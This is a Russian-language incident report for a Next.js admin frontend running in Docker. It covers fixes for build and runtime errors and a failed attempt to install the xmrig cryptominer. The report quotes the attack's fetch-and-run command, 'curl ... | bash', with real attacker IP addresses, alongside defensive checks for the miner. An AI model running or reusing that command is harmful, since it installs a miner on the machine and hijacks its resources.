# –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –æ—à–∏–±–æ–∫ Frontend Admin

## –î–∞—Ç–∞: 29 –¥–µ–∫–∞–±—Ä—è 2025

## –ü—Ä–æ–±–ª–µ–º—ã, –∫–æ—Ç–æ—Ä—ã–µ –±—ã–ª–∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω—ã

### 1. ReferenceError: returnNaN is not defined
**–ü—Ä–∏—á–∏–Ω–∞**: –ü—Ä–æ–±–ª–µ–º–∞ —Å –º–∏–Ω–∏—Ñ–∏–∫–∞—Ü–∏–µ–π/–∫–æ–º–ø–∏–ª—è—Ü–∏–µ–π Next.js 15.5.5

**–†–µ—à–µ–Ω–∏–µ**: 
- –î–æ–±–∞–≤–ª–µ–Ω–∞ –≥–ª–æ–±–∞–ª—å–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫ –≤ `layout.tsx`
- –£–ª—É—á—à–µ–Ω–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è webpack –≤ `next.config.js`

### 2. EACCES: permission denied, open '/dev/lrt' –∏ '//lrt'
**–ü—Ä–∏—á–∏–Ω–∞**: –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –ø—É—Å—Ç—ã—Ö –∏–ª–∏ –Ω–µ–≤–∞–ª–∏–¥–Ω—ã—Ö –ø—É—Ç–µ–π –∫ —Ñ–∞–π–ª–∞–º

**–†–µ—à–µ–Ω–∏–µ**:
- –î–æ–±–∞–≤–ª–µ–Ω–∞ –≥–ª–æ–±–∞–ª—å–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫
- –£–ª—É—á—à–µ–Ω–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∞ –∏—Å–∫–ª—é—á–µ–Ω–∏–π

### 3. ECONNREFUSED ::1:3004
**–ü—Ä–∏—á–∏–Ω–∞**: –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –Ω–µ—Å—É—â–µ—Å—Ç–≤—É—é—â–µ–º—É –ø–æ—Ä—Ç—É

**–†–µ—à–µ–Ω–∏–µ**:
- –ü—Ä–æ–≤–µ—Ä–µ–Ω–æ, —á—Ç–æ `NEXT_PUBLIC_API_URL` –Ω–∞—Å—Ç—Ä–æ–µ–Ω –ø—Ä–∞–≤–∏–ª—å–Ω–æ
- –î–æ–±–∞–≤–ª–µ–Ω–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫ —Å–µ—Ç–∏

### 4. –ú–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–µ SIGTERM –∏ uncaughtException
**–ü—Ä–∏—á–∏–Ω–∞**: –ù–µ–æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã–µ –æ—à–∏–±–∫–∏ –∏ –æ—Ç–∫–ª–æ–Ω–µ–Ω–Ω—ã–µ –ø—Ä–æ–º–∏—Å—ã

**–†–µ—à–µ–Ω–∏–µ**:
- –î–æ–±–∞–≤–ª–µ–Ω—ã –≥–ª–æ–±–∞–ª—å–Ω—ã–µ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ `error` –∏ `unhandledrejection` –≤ `layout.tsx`
- –£–ª—É—á—à–µ–Ω–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è webpack —Å fallback –¥–ª—è node –º–æ–¥—É–ª–µ–π

### 5. üö® –ü–æ–ø—ã—Ç–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –º–∞–π–Ω–µ—Ä–∞ (–ù–ï —É–¥–∞–ª–∞—Å—å)
**–û–±–Ω–∞—Ä—É–∂–µ–Ω–æ**: –ü–æ–ø—ã—Ç–∫–∏ —Å–∫–∞—á–∞—Ç—å –∏ –∑–∞–ø—É—Å—Ç–∏—Ç—å `xmrig` –º–∞–π–Ω–µ—Ä
```
curl http://146.190.48.14:9000/install.sh | bash
Connecting to 91.92.242.214 (91.92.242.214:80)
chmod: xmrig: No such file or directory
```

**–°—Ç–∞—Ç—É—Å**: ‚úÖ –ê—Ç–∞–∫–∞ –ù–ï —É–¥–∞–ª–∞—Å—å –±–ª–∞–≥–æ–¥–∞—Ä—è alpine –æ–±—Ä–∞–∑—É (–Ω–µ—Ç bash, curl, wget)

**–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏—è**: –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø–∞–∫–µ—Ç–æ–≤:
```bash
npm audit
npm audit fix
```

## –í–Ω–µ—Å–µ–Ω–Ω—ã–µ –∏–∑–º–µ–Ω–µ–Ω–∏—è

### 1. `src/app/layout.tsx`
–î–æ–±–∞–≤–ª–µ–Ω—ã –≥–ª–æ–±–∞–ª—å–Ω—ã–µ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –æ—à–∏–±–æ–∫:
```typescript
<Script id="error-handler" strategy="beforeInteractive">
  {`
    // –ì–ª–æ–±–∞–ª—å–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–µ–æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã—Ö –æ—à–∏–±–æ–∫
    window.addEventListener('error', function(event) {
      console.error('Global error caught:', event.error);
      event.preventDefault();
    });
    
    // –û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–µ–æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã—Ö –ø—Ä–æ–º–∏—Å–æ–≤
    window.addEventListener('unhandledrejection', function(event) {
      console.error('Unhandled promise rejection:', event.reason);
      event.preventDefault();
    });
  `}
</Script>
```

### 2. `next.config.js`
–£–ª—É—á—à–µ–Ω–∞ webpack –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è:
```javascript
webpack: (config, { dev, isServer }) => {
  // Production –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏
  if (!dev && !isServer) {
    config.optimization = {
      ...config.optimization,
      moduleIds: 'deterministic',
      runtimeChunk: 'single',
      minimize: true,
      splitChunks: {
        chunks: 'all',
        cacheGroups: {
          vendor: {
            name: 'vendor',
            chunks: 'all',
            test: /node_modules/,
            priority: 20,
          },
          common: {
            name: 'common',
            minChunks: 2,
            chunks: 'all',
            priority: 10,
            reuseExistingChunk: true,
            enforce: true,
          },
        },
      },
    }
  }

  // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ –º–æ–¥—É–ª–∏, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –≤—ã–∑—ã–≤–∞—Ç—å –ø—Ä–æ–±–ª–µ–º—ã
  config.resolve = config.resolve || {}
  config.resolve.fallback = {
    ...config.resolve.fallback,
    fs: false,
    net: false,
    tls: false,
  }

  return config
}
```

## –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏

### 1. –ü–µ—Ä–µ—Å–æ–±–µ—Ä–∏—Ç–µ Docker –æ–±—Ä–∞–∑
```bash
# –í –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ frontend/front admin
docker build -t front_admin:latest .

# –ò–ª–∏ —á–µ—Ä–µ–∑ docker-compose
docker-compose build front_admin
```

### 2. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –Ω–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å
```bash
cd "frontend/front admin"
npm audit
npm audit fix

# –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ –ø–∞–∫–µ—Ç—ã
npm ls xlsx
npm ls @tailwindcss/postcss
```

### 3. –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –ø–æ—Å–ª–µ –¥–µ–ø–ª–æ—è
1. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∫–æ–Ω—Å–æ–ª—å –±—Ä–∞—É–∑–µ—Ä–∞ - –Ω–µ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –æ—à–∏–±–æ–∫ `returnNaN` –∏ `EACCES`
2. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ª–æ–≥–∏ —Å–µ—Ä–≤–µ—Ä–∞ - –Ω–µ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å `uncaughtException`
3. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–æ—Ü–µ—Å—Å—ã –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ:
```bash
ps aux | grep xmrig
ps aux | grep -i mine
```

## –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å

### Dockerfile - –∑–∞–ø—Ä–µ—Ç–∏—Ç—å postinstall —Å–∫—Ä–∏–ø—Ç—ã
–î–æ–±–∞–≤—å—Ç–µ –≤ `Dockerfile`:
```dockerfile
# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π –ë–ï–ó –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è postinstall —Å–∫—Ä–∏–ø—Ç–æ–≤
RUN npm ci --ignore-scripts
```

### –ü—Ä–æ–≤–µ—Ä–∫–∞ package-lock.json
```bash
grep -r "postinstall\|preinstall" package-lock.json | grep -i "xmrig\|mine\|146.190\|91.92"
```

## –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ—Å–ª–µ –¥–µ–ø–ª–æ—è

1. ‚úÖ –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä –∑–∞–ø—É—Å—Ç–∏–ª—Å—è: `docker ps | grep front_admin`
2. ‚úÖ –ù–µ—Ç –æ—à–∏–±–æ–∫ –≤ –ª–æ–≥–∞—Ö: `docker logs front_admin --tail 100`
3. ‚úÖ –°–∞–π—Ç –¥–æ—Å—Ç—É–ø–µ–Ω: `curl http://localhost:3004`
4. ‚úÖ –ù–µ—Ç –º–∞–π–Ω–µ—Ä–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ: `ps aux | grep xmrig`

## –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è

- Next.js –≤–µ—Ä—Å–∏—è: 15.5.5
- React –≤–µ—Ä—Å–∏—è: 18.3.1
- Node.js —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ–º–∞—è –≤–µ—Ä—Å–∏—è: 20.x
- API URL: `https://api.lead-schem.ru/api/v1`

## –ö–æ–Ω—Ç–∞–∫—Ç—ã

–ï—Å–ª–∏ –ø—Ä–æ–±–ª–µ–º—ã –ø—Ä–æ–¥–æ–ª–∂–∞—é—Ç—Å—è, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ:
1. –õ–æ–≥–∏ Docker –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞
2. –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è
3. –î–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å API –Ω–∞ `https://api.lead-schem.ru`

